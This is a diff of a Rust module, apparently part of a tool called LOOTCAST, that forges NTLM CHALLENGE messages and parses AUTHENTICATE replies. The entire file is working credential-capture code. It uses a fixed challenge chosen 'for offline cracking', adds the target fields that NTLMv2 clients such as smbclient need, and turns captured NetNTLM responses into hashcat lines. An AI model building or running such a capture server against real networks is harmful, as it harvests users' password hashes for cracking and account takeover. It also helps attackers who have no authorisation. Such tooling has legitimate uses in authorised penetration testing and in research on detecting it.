@@ -1,23 +1,58 @@
-//! Construção do desafio NTLMSSP (Type 2) e parsing do Type 3 para hashcat.
+//! NTLMSSP CHALLENGE (Type 2) construction and AUTHENTICATE (Type 3) parsing.
 use base64::{engine::general_purpose::STANDARD, Engine};
 
 /// Classic fixed challenge — convenient for offline cracking.
 pub const CHALLENGE: [u8; 8] = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
 
-/// Mensagem CHALLENGE (Type 2) base64, para o header WWW-Authenticate: NTLM.
-pub fn type2_b64() -> String {
+fn utf16(s: &str) -> Vec<u8> {
+    s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect()
+}
+
+fn av_pair(id: u16, val: &[u8]) -> Vec<u8> {
+    let mut v = id.to_le_bytes().to_vec();
+    v.extend_from_slice(&(val.len() as u16).to_le_bytes());
+    v.extend_from_slice(val);
+    v
+}
+
+/// Raw CHALLENGE (Type 2) message bytes, including a TargetName and a TargetInfo
+/// (AV pairs) — both required by NTLMv2 clients such as smbclient.
+pub fn type2_bytes() -> Vec<u8> {
+    let target_name = utf16("LOOTCAST");
+    let nb = utf16("LOOTCAST");
+    let dns = utf16("lootcast");
+    let mut target_info = Vec::new();
+    target_info.extend(av_pair(0x0002, &nb)); // MsvAvNbDomainName
+    target_info.extend(av_pair(0x0001, &nb)); // MsvAvNbComputerName
+    target_info.extend(av_pair(0x0004, &dns)); // MsvAvDnsDomainName
+    target_info.extend(av_pair(0x0003, &dns)); // MsvAvDnsComputerName
+    target_info.extend(av_pair(0x0000, &[])); // MsvAvEOL
+
+    let tn_off: u32 = 48;
+    let ti_off: u32 = tn_off + target_name.len() as u32;
+    // UNICODE | REQUEST_TARGET | NTLM | ALWAYS_SIGN | TARGET_TYPE_DOMAIN | TARGET_INFO
+    let flags: u32 = 0x1 | 0x4 | 0x200 | 0x8000 | 0x10000 | 0x80_0000;
+
     let mut m = Vec::new();
     m.extend_from_slice(b"NTLMSSP\0");
     m.extend_from_slice(&2u32.to_le_bytes()); // type 2
-    m.extend_from_slice(&[0, 0, 0, 0]); // TargetName len/maxlen
-    m.extend_from_slice(&48u32.to_le_bytes()); // TargetName offset
-    let flags: u32 = 0x0000_0001 | 0x0000_0200 | 0x0080_0000 | 0x0000_8000 | 0x0002_0000;
+    m.extend_from_slice(&(target_name.len() as u16).to_le_bytes()); // TargetName len
+    m.extend_from_slice(&(target_name.len() as u16).to_le_bytes()); // TargetName maxlen
+    m.extend_from_slice(&tn_off.to_le_bytes()); // TargetName offset
     m.extend_from_slice(&flags.to_le_bytes());
     m.extend_from_slice(&CHALLENGE); // server challenge
     m.extend_from_slice(&[0u8; 8]); // reserved
-    m.extend_from_slice(&[0, 0, 0, 0]); // TargetInfo len/maxlen
-    m.extend_from_slice(&48u32.to_le_bytes()); // TargetInfo offset
-    STANDARD.encode(m)
+    m.extend_from_slice(&(target_info.len() as u16).to_le_bytes()); // TargetInfo len
+    m.extend_from_slice(&(target_info.len() as u16).to_le_bytes()); // TargetInfo maxlen
+    m.extend_from_slice(&ti_off.to_le_bytes()); // TargetInfo offset
+    m.extend_from_slice(&target_name);
+    m.extend_from_slice(&target_info);
+    m
+}
+
+/// CHALLENGE (Type 2) base64, for the WWW-Authenticate: NTLM header.
+pub fn type2_b64() -> String {
+    STANDARD.encode(type2_bytes())
 }
 
 fn utf16le(bytes: &[u8]) -> String {
@@ -48,19 +83,24 @@ pub struct Captured {
     pub hashcat: String,
 }
 
-/// Parseia a mensagem AUTHENTICATE (Type 3) e devolve linha hashcat NetNTLM.
+/// Parses an AUTHENTICATE (Type 3) message from base64 into a hashcat line.
 pub fn parse_type3(b64: &str) -> Option<Captured> {
     let m = STANDARD.decode(b64.trim()).ok()?;
+    parse_type3_bytes(&m)
+}
+
+/// Parses raw AUTHENTICATE (Type 3) message bytes into a hashcat NetNTLM line.
+pub fn parse_type3_bytes(m: &[u8]) -> Option<Captured> {
     if m.len() < 52 || &m[0..8] != b"NTLMSSP\0" {
         return None;
     }
     if u32::from_le_bytes([m[8], m[9], m[10], m[11]]) != 3 {
         return None;
     }
-    let (lm_len, lm_off) = sec_buffer(&m, 12)?;
-    let (nt_len, nt_off) = sec_buffer(&m, 20)?;
-    let (dom_len, dom_off) = sec_buffer(&m, 28)?;
-    let (usr_len, usr_off) = sec_buffer(&m, 36)?;
+    let (lm_len, lm_off) = sec_buffer(m, 12)?;
+    let (nt_len, nt_off) = sec_buffer(m, 20)?;
+    let (dom_len, dom_off) = sec_buffer(m, 28)?;
+    let (usr_len, usr_off) = sec_buffer(m, 36)?;
 
     let domain = m.get(dom_off..dom_off + dom_len).map(utf16le).unwrap_or_default();
     let user = m.get(usr_off..usr_off + usr_len).map(utf16le).unwrap_or_default();
